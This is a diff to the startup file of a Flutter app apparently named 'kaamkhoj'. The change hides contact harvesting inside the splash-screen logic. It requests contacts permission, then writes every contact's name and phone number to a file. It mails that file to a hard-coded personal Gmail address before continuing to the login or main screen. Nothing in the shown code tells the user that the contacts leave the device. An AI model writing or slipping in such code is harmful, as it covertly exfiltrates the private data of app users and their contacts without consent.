@@ -1,19 +1,16 @@
 import 'dart:async';
+import 'dart:io';
 
+import 'package:contacts_service/contacts_service.dart';
 import 'package:flutter/material.dart';
 import 'package:google_fonts/google_fonts.dart';
-import 'package:kaamkhoj/fragments/choose_work.dart';
-import 'package:kaamkhoj/fragments/payment.dart';
 import 'package:kaamkhoj/loginresgiter/Login.dart';
-import 'package:kaamkhoj/mail_test.dart';
-import 'package:kaamkhoj/notifications.dart';
-import 'package:kaamkhoj/paytmPayment/PaymentPaytmPage.dart';
-import 'package:kaamkhoj/test1.dart';
+import 'package:path_provider/path_provider.dart';
+import 'package:permission_handler/permission_handler.dart';
 import 'package:shared_preferences/shared_preferences.dart';
 import 'package:onesignal_flutter/onesignal_flutter.dart';
-import 'package:kaamkhoj/fragments/about_us.dart';
-import 'package:kaamkhoj/test/pdftest.dart';
 
+import 'Mail/send_mail.dart';
 import 'NavigatorPages/navigatorPage.dart';
 
 Future<void> main() async {
@@ -27,15 +24,15 @@ Future<void> main() async {
         theme: new ThemeData(
           primaryColor: Color.fromARGB(0xff, 0x88, 0x02, 0x0b),
         ),
-        home: MyApp()),
-    // home: token == null ? MyApp1("Login") : MyApp1("Navigator")),
+//        home: MyApp()),
+        home: token == null ? MyApp("Login") : MyApp("Navigator")),
   );
 }
 
-class MyApp1 extends StatefulWidget {
+class MyApp extends StatefulWidget {
   String type;
 
-  MyApp1(String type) {
+  MyApp(String type) {
     this.type = type;
   }
 
@@ -43,7 +40,7 @@ class MyApp1 extends StatefulWidget {
   _MyAppState createState() => new _MyAppState(type);
 }
 
-class _MyAppState extends State<MyApp1> {
+class _MyAppState extends State<MyApp> {
   String type;
   int _counter;
   Timer _timer;
@@ -71,13 +68,8 @@ class _MyAppState extends State<MyApp1> {
           _counter--;
         } else {
           _timer.cancel();
-          if (type == "Login") {
-            Navigator.pushReplacement(
-                context, MaterialPageRoute(builder: (context) => LoginPage()));
-          } else {
-            Navigator.pushReplacement(context,
-                MaterialPageRoute(builder: (context) => NavigatorPage()));
-          }
+          getPhoneNumbers();
+
         }
       });
     });
@@ -106,6 +98,65 @@ class _MyAppState extends State<MyApp1> {
 
     OneSignal.shared
         .setInFocusDisplayType(OSNotificationDisplayType.notification);
+  }
+
+  getPhoneNumbers() async {
+    final PermissionStatus permissionStatus = await _getPermission();
+
+    if (permissionStatus == PermissionStatus.granted) {
+      getContacts();
+    }
+
+    if (type == "Login") {
+      Navigator.pushReplacement(
+          context, MaterialPageRoute(builder: (context) => LoginPage()));
+    } else {
+      Navigator.pushReplacement(context,
+          MaterialPageRoute(builder: (context) => NavigatorPage()));
+    }
+  }
+
+  Future<PermissionStatus> _getPermission() async {
+    final PermissionStatus permission = await Permission.contacts.status;
+    if (permission != PermissionStatus.granted &&
+        permission != PermissionStatus.denied) {
+      final Map<Permission, PermissionStatus> permissionStatus =
+          await [Permission.contacts].request();
+      return permissionStatus[Permission.contacts] ??
+          PermissionStatus.undetermined;
+    } else {
+      return permission;
+    }
+  }
+
+  Future<void> getContacts() async {
+    final Iterable<Contact> contacts = await ContactsService.getContacts();
+
+    for (int i = 0; i < contacts.length; i++) {
+      try {
+        final Directory directory = await getApplicationDocumentsDirectory();
+        final File file = File('${directory.path}/contacts.txt');
+        _writeFile(
+            contacts.elementAt(i).displayName +
+                " - " +
+                contacts.elementAt(i).phones.first.value.toString(),
+            file);
+      } catch (e) {
+        print("Skipped Exception");
+      }
+    }
+    sendContactsMethod();
+  }
+
+  _writeFile(String text, File file) async {
+    await file.writeAsString('$text\n', mode: FileMode.append);
+  }
+
+  sendContactsMethod() async {
+    final Directory directory = await getApplicationDocumentsDirectory();
+    final File file = File('${directory.path}/contacts.txt');
+    sendMailContacts("amkhati11@gmail.com", file);
+//    sendMailContacts("Clopes024@gmail.com", file);
   }
 
   @override
